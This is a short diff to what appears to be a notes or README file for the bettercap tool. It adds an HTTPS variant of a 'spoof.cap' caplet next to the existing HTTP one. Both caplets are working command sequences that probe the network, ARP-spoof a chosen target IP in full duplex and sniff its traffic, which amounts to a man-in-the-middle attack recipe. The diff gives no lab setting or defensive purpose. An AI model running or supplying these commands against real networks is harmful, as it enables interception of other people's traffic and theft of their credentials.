@@ -10,12 +10,22 @@
   bettercap iface <b>name_of_interface</b>
 </p>
 
-## spoof.cap
+## spoof.cap - http://
 
 net.probe on
 </br>set arp.spoof.fullduplex true
 </br>set arp.spoof.target **target IP**
 </br>arp.spoof on
+</br>net.sniff on
+
+# spoof.cap - https://
+
+net.probe on
+</br>net.recon on
+</br>set arp.spoof.fullduplex true
+</br>set arp.spoof.target **target IP**
+</br>arp.spoof on
+</br>set net.sniff.local true
 </br>net.sniff on
 
 ## bettercap caplet
